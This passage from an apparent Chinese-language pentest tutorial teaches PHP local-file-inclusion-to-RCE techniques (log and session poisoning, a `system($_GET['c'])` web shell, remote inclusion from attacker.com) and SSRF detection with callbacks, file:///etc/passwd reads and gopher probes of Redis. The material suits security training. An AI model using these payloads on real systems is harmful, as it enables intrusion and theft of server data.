- 预期结果：其中一种字段以原样 PHP 存入日志，包含后执行。
- 如果不行：全部被编码 → 用 `<?php echo md5(1);?>` 这类无尖括号混淆的 payload 也不可行时，改投 Session（第 5 步）。

#### 第 5 步：Session 文件包含
操作：把代码写进 Session 值（如登录用户名、搜索框内容等会被 `$_SESSION` 存储的字段），再包含 Session 文件。
```bash
# 先登录/操作让会话写入可控值（比如用户名填 payload）
# Session 文件路径（Debian/Ubuntu）：
curl -s 'http://t/?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>'
# CentOS 常见路径：/var/lib/php/session/sess_<PHPSESSID>
```
- 预期结果：Session 文件内容被当 PHP 执行，输出命令结果。
- 如果不行：Session 值被序列化包裹（`username|s:20:"<?php...";`），代码不在文件开头导致语法错 → 用 `php://filter` 读 sess 文件看存储格式，payload 前补闭合构造。

#### 第 6 步：/proc/self/environ（CGI 模式）
操作：若目标是 CGI 模式 PHP（少见），环境变量会写入 `/proc/self/environ`，UA 即环境变量。
```bash
curl -s -A '<?php system($_GET["c"]);?>' 'http://t/'
curl -s 'http://t/?page=../../../../proc/self/environ&c=id'
```
- 预期结果：输出命令结果。
- 如果不行：现代 FPM 模式 `/proc/self/environ` 通常为空或无权限，跳过此步。

#### 第 7 步：远程包含 RFI（了解即可）
操作：如果 `allow_url_include=On`（前面已确认过的话），远程包含恶意文件，注意用 `?` 或 `%23` 截断服务端拼接的后缀。
```bash
?page=http://attacker.com/shell.txt?
?page=http://attacker.com/shell.txt%23&c=id
```
- 预期结果：`shell.txt`（内容为 `<?php system($_GET["c"]);?>`）被远程拉取执行。
- 如果不行：现代 PHP 默认 Off，基本不可用；RFI 失败不意外，重心放在日志投毒上。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 包含日志输出原样代码 | 日志对尖括号 URL 编码 | 换 Referer/Cookie 投毒；先 filter 读日志看形态 |
| PHP 语法错误 | 日志多行记录污染代码上下文 | payload 前加 `//` 或 `/*` 闭合；投毒到专门的行 |
| Session 包含语法错 | 序列化包裹了 payload | filter 读 sess 文件，payload 补闭合 |
| 日志路径找不到 | 中间件/发行版路径不同 | filter 读配置文件找 CustomLog/access_log 指令 |

#### 实战要点
- LFI 到 RCE 的优先级：filter 读源码 → 日志/session 投毒包含 → 伪协议执行 → RFI（最后才考虑）。
- 日志投毒不要求包含深度可控，只要最终能拼到日志**绝对路径**即可，`../` 层级可以暴力多试。
- UA、Referer、Cookie 三个字段都投一份，总有一份不被编码。
- 日志路径先靠报错泄露或配置文件拿真实值，别在错误路径上反复烧请求。
- 投毒 payload 用 `<?php system($_GET["c"]);?>` 这类短代码，日志里好找、好触发。
- RFI 现代环境基本不可用，遇到 `allow_url_include=On` 属于中彩票，优先把日志投毒吃透。

> [!tip] UA 里的 PHP 可能被日志 URL 编码（`%3C?php`），多试原样/编码两种投毒；也可投到 Referer、Cookie。

> [!warn] RFI 现代环境基本不可用；LFI 优先级：filter 读源码 → 日志/session 投毒包含 → 跑 phpggc 链。日志包含不要求 include 里路径可控深度，只要最终能拼到日志绝对路径。

## [g-ssrf] SSRF——探测回连、协议利用到 gopher 打内网

### [ssrf-detect] SSRF 探测与回连验证 | easy | SSRF;探测;回连 | -
> 参数可控的 URL 触发服务端请求，用带外平台确认并判断出网与回连主体。

#### 这个条目的作用
SSRF 的核心是：**参数里写的 URL，是服务器去请求，而不是你的浏览器**。比如"图片预览""URL 转码""文档下载"功能，服务端拿到 `url=` 参数后会自己去访问。这一条教你三件事：找到可控 URL 的触发点、用带外回连证明"确实是服务端在请求"、以及排除"参数其实是浏览器打开的"伪 SSRF。

#### 前置条件
- 有一个可以接收请求的外部服务器（VPS），或一个带外 DNS 平台（dnslog.cn / interactsh）
- 目标有疑似把 URL 当参数的接口（下载、预览、回调类功能）
- 你的 VPS 公网 IP 已知

#### 第 1 步：找到 URL 触发点
操作：按参数名和功能面两条线扫：
- 参数名：`url=` `src=` `path=` `image=` `download=` `target=` `callback=` `redirect=` `link=`
- 功能点：图片/文档在线预览、PDF 生成、爬虫抓取、Webhook 配置、二维码生成、SSO 回调、头像远程加载
```bash
# 在 Burp 里逐个功能抓包，观察请求参数里有没有 URL 形态的值
# 例如：POST /preview  {"url":"http://example.com/a.png"}
```
- 预期结果：找到至少一个"值是一段 URL"的参数，且修改它会影响响应（比如图片加载失败/成功）。
- 如果不行：抓包全部参数都是 ID/文件名 → 可能不是直接 URL 型 SSRF，先分析 JS 里有没有拼接 URL 的接口。

#### 第 2 步：用 VPS 回连确认"服务端在请求"
操作：把你的 VPS 起一个 HTTP 监听，然后让参数指向你 VPS 的 IP。
```bash
# VPS 上监听
nc -lvnp 8080
# 目标上触发
?url=http://<你的VPS公网IP>:8080/ssrf-probe
```
- 预期结果：VPS 的 nc 收到一个连接请求（记录了来源 IP）→ SSRF 确认，且来源 IP 就是目标的出口 IP。
- 如果不行：VPS 完全无连接 → 参数可能不触发请求（或被 SSRF 防护拦截了外网 IP），换第 3 步的 DNS 方式再验。

#### 第 3 步：带外 DNS 回连（无 VPS 也行的替代）
操作：用 dnslog/interactsh 平台生成一个子域名，让参数访问它。
```bash
# interactsh 起监听
interactsh-client
# 目标上触发
?url=http://<interactsh给的子域名>.oast.fun
```
- 预期结果：平台记录到一次 DNS 解析/HTTP 请求，记录里带目标服务器出口 IP → SSRF 确认。
- 如果不行：无任何记录 → 外网被拦（只允许内网/白名单），进入第 5 步测内网与绕过。

#### 第 4 步：排除伪 SSRF（CSRF 型）
操作：对比"回连记录里的来源 IP"和"你自己的公网 IP"。
- 判断：如果来源 IP 是**你的公网 IP**（或你所在网络的出口 IP）→ 说明请求是**浏览器**发的，参数只是被前端拿去 `fetch` 了，这是伪 SSRF，不能用于打内网。
- 如果来源 IP 是**目标的 IP**（和访问目标网站时的出口一致）→ 真 SSRF 确认。
- 预期结果：明确了回连主体是谁，这决定了后续能不能打内网。
- 如果不行：IP 无法区分（同网段）→ 发一个"只有服务端才可能访问到"的目标（如 `http://127.0.0.1:80` 配一个本机指纹），看响应差异判断。

#### 第 5 步：探测过滤与协议支持范围
操作：依次测三件事，决定利用方向：
```bash
# 1) 回连外网：确定 http/https 出网
?url=http://xxx.dnslog.cn
# 2) localhost/内网是否被禁
?url=http://127.0.0.1:80
?url=http://127.0.0.1:8080
# 3) 非 http 协议是否可用
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
?url=gopher://127.0.0.1:6379/_info
```
- 预期结果：`127.0.0.1` 有响应（或响应与访问外网明显不同）→ 内网可达，可继续协议利用（见 ssrf-protocol）；`file://` 能读到内容 → 支持任意协议。
- 如果不行：localhost 被拦 → 记下"有防护"这个结论，后续用绕过表（IP 进制、重定向、DNS 重绑定）再测。

#### 第 6 步：记录证据链
操作：把每一步的请求、回连记录、响应差异截图/存档：
- 触发点：哪个参数、哪个功能、原始请求
- 回连记录：时间戳 + 来源 IP（证明服务端发起）
- 响应差异：访问内网端口与访问外网的响应长度/内容对比
- 预期结果：形成一条"参数 → 服务端请求 → 回连来源 IP = 目标"的完整证据链。
- 如果不行：证据不足时继续补测，SSRF 报告里"来源 IP 证明"是最关键的一环。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| VPS 收到连接但 IP 是你自己 | 伪 SSRF（浏览器发起） | 无法打内网，只能当信息点记录 |
| 外网回连成功但 127.0.0.1 无响应 | 内网/本地地址被防护拦截 | 用绕过表（进制 IP/重定向/重绑定）再测 |
| file:// 读不到 | 协议白名单只放 http(s) | 转 http 内网探测方向 |
| 参数触发但无回连 | 参数不是服务端请求/被 WAF | 换同功能其他参数名再试 |

#### 实战要点
- 判真伪 SSRF 看回连来源 IP：等于目标出口 IP 才是真的，等于你自己就是伪 SSRF。
- 探测顺序固定：http 回连 → localhost 限制 → 协议支持，三问定方向。
- dnslog 是零成本验证神器，回连 IP、出网能力、盲打确认全靠它。
- 每个可疑 URL 参数都值得试一遍，图片预览、PDF 生成这类功能命中率最高。
- 确认真 SSRF 后再谈利用，别在伪 SSRF 上浪费时间构造 gopher。

> [!tip] 回连 IP 必须是目标服务器公网 IP 而不是你自己的——排除"参数最终由浏览器打开"的伪 SSRF（CSRF 型）。

> [!warn] 探测到 SSRF 后别急着打云元数据：先确认目标确实在云环境（见 ssrf-protocol 的元数据章节），裸机上 169.254.169.254 是空耗。
